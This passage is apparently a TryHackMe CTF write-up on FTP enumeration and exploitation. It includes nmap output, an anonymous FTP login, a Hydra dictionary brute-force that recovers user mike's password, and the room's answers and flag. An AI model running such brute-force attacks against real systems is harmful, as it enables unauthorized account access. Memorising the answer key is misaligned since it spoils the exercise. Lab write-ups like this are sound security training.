No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/25%OT=21%CT=1%CU=43401%PV=Y%DS=2%DC=I%G=Y%TM=5F95E8
OS:C7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: Welcome

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.92 seconds
```

`2`

2. What port is ftp running on?

`21`

3. What variant of FTP is running on it?

`vsftpd`

4. Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted. What is the name of the file in the anonymous FTP directory?

```
kali@kali:~/CTFs/tryhackme/Network Services$ ftp 10.10.153.14
Connected to 10.10.153.14.
220 Welcome to the administrator FTP service.
Name (10.10.153.14:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
226 Directory send OK.
ftp>
```

5. What do we think a possible username could be?

```
ftp> get PUBLIC_NOTICE.txt
local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
226 Transfer complete.
353 bytes received in 0.00 secs (118.1785 kB/s)
ftp>
```

```
kali@kali:~/CTFs/tryhackme/Network Services$ cat PUBLIC_NOTICE.txt
===================================
MESSAGE FROM SYSTEM ADMINISTRATORS
===================================

Hello,

I hope everyone is aware that the
FTP server will not be available
over the weekend- we will be
carrying out routine system
maintenance. Backups will be
made to my account so I reccomend
encrypting any sensitive data.

Cheers,

Mike
```

`Mike`

6. Great! Now we've got details about the FTP server and, crucially, a possible username. Let's see what we can do with that...

`No answer needed`

## Task 10 Exploiting FTP

**Types of FTP Exploit**

Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.

With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by JSCape demonstrates and explains this process using APR-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.

When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.

**Method Breakdown**

So, from our enumeration stage, we know:

- There is an FTP server running on this machine
- We have a possible username

Using this information, let's try and bruteforce the password of the FTP Server.

**Hydra**

Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.

The syntax for the command we're going to use to find the passwords is this:
"`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`"

Let's break it down:

| SECTION                 | FUNCTION                                                                             |
| ----------------------- | ------------------------------------------------------------------------------------ |
| hydra                   | Runs the hydra tool                                                                  |
| -t 4                    | Number of parallel connections per target                                            |
| -l [user]               | Points to the user who's account you're trying to compromise                         |
| -P [path to dictionary] | Points to the file containing the list of possible passwords                         |
| -vV                     | Sets verbose mode to very verbose, shows the login+pass combination for each attempt |
| [machine IP]            | The IP address of the target machine                                                 |
| ftp / protocol          | Sets the protocol                                                                    |

Let's crack some passwords!

1. What is the password for the user "mike"?

```
kali@kali:~/CTFs/tryhackme/Network Services$ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt 10.10.153.14 ftp
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-25 22:13:09
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.153.14:21/
[21][ftp] host: 10.10.153.14   login: mike   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-25 22:13:17
```

`password`

2. Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and entering the credentials when prompted

```
kali@kali:~/CTFs/tryhackme/Network Services$ ftp 10.10.153.14
Connected to 10.10.153.14.
220 Welcome to the administrator FTP service.
Name (10.10.153.14:kali): mike
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

`No answer needed`

3. What is ftp.txt?

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
-rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
226 Directory send OK.
ftp> get ftp.txt
local: ftp.txt remote: ftp.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ftp.txt (26 bytes).
226 Transfer complete.
26 bytes received in 0.00 secs (52.5686 kB/s)
ftp> exit
221 Goodbye.
kali@kali:~/CTFs/tryhackme/Network Services$ cat ftp.txt
THM{y0u_g0t_th3_ftp_fl4g}
```

`THM{y0u_g0t_th3_ftp_fl4g}`

## Task 11 Expanding Your Knowledge

**Further Learning**

There is no checklist of things to learn until you've officially learnt everything you can. There will always be things that surprise us all, especially in the sometimes abstract logical problems of capture the flag challenges. But, as with anything, practice makes perfect. We can all look back on the things we've learnt after completing something challenging and I hope you feel the same about this room.

**Reading**

Here's some things that might be useful to read after completing this room, if it interests you:

[https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef](https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef)
[https://attack.mitre.org/techniques/T1210/](https://attack.mitre.org/techniques/T1210/)
[https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)

**Thank you**

Thanks for taking the time to work through this room, I wish you the best of luck in future.

~ Polo

1. Well done, you did it!

`No answer needed`
